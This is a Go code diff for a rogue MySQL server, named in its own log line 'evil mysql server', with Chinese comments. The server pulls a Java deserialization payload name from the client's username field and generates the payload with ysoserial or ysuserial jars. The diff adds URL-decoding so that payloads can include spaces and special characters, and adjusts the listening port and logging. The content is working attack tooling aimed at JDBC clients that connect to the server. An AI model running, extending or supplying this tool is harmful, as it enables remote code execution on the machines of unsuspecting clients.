@@ -9,17 +9,18 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"net/url"
 	"os"
 	"os/exec"
 	"strings"
 )
 
-const Version = "v0.3"
+const Version = "v0.4"
 
-var addr = flag.String("addr", "0.0.0.0:3306", "监听地址,默认0.0.0.0:3306")
-var javaBinPath = flag.String("java", "java", "java可执行文件路径,默认JAVA_HOME路径")
-var ysoserialPath = flag.String("ysoserial", "ysoserial-0.0.6-SNAPSHOT-all.jar", "ysoserial可执行文件路径; payload:yso_CommonsCollections5_calc")
-var ysuserialPath = flag.String("ysuserial", "ysuserial-1.5-su18-all.jar", "ysuserial可执行文件路径; payload:ysu_CommonsCollections5_calc")
+var port = flag.String("p", "3306", "监听端口, 默认监听3306")
+var javaBinPath = flag.String("java", "java", "java可执行文件路径, 默认JAVA_HOME路径")
+var ysoserialPath = flag.String("ysoserial", "ysoserial-0.0.6-SNAPSHOT-all.jar", "ysoserial.jar的文件路径; payload: yso_CommonsCollections5_calc")
+var ysuserialPath = flag.String("ysuserial", "ysuserial-1.5-su18-all.jar", "ysuserial.jar的文件路径; payload: ysu_CommonsCollections5_calc")
 
 func init() {
 	flag.Parse()
@@ -184,9 +185,20 @@ func handleAccept(conn net.Conn) {
 			return
 		}
 
+		//- 从客户端发送的第一个认证数据包中提取
+		//- MySQL 协议中，用户名从数据包偏移量 36 开始
+		//- 以空字节（\0）作为结束标志
+		//- 示例：如果数据包内容是 ...yso_CommonsCollections5_calc\0...，提取后得到 "yso_CommonsCollections5_calc"
 		if firstPacket {
 			username = string(bytes.Split(buffer[36:], []byte{0})[0])
-			log.Printf("[-] username: %s\n", username)
+			// URL 解码，支持特殊字符和空格，这样可以在payload中插入空格和特殊字符
+			decodedUsername, err := url.QueryUnescape(username)
+			if err == nil {
+				username = decodedUsername
+				log.Printf("[+] username (URL decoded): %s\n", username)
+			} else {
+				log.Printf("[-] username: %s (URL decode failed: %s)\n", username, err.Error())
+			}
 			Write(conn, BuildPacket(2, OK))
 			firstPacket = false
 			continue
@@ -214,7 +226,7 @@ func handleAccept(conn net.Conn) {
 				payload := params[1]
 				command := params[2]
 
-				log.Printf(*javaBinPath)
+				log.Printf("[-] javaBinPath: " + *javaBinPath)
 
 				var cmd *exec.Cmd
 				if useYso {
@@ -278,11 +290,12 @@ func handleAccept(conn net.Conn) {
 }
 
 func Start() {
-	listenAddr := *addr
-	if !strings.Contains(listenAddr, ":") {
-		listenAddr = "0.0.0.0:" + listenAddr
-	}
-	log.Printf("[-] evil mysql server %s listen on %s\n", Version, listenAddr)
+	listenAddr := *port
+	listenAddr = "0.0.0.0:" + listenAddr
+	//if !strings.Contains(listenAddr, ":") {
+	//	listenAddr = "0.0.0.0:" + listenAddr
+	//}
+	log.Printf("[+] evil mysql server %s listen on %s\n", Version, listenAddr)
 	ln, err := net.Listen("tcp", listenAddr)
 	if err != nil {
 		log.Printf("[x] listen error [%s]\n", err.Error())
@@ -290,6 +303,7 @@ func Start() {
 	}
 	for {
 		conn, err := ln.Accept()
+		log.Printf("")
 		if err != nil {
 			log.Printf("[x] accept error [%s]\n", err.Error())
 			continue
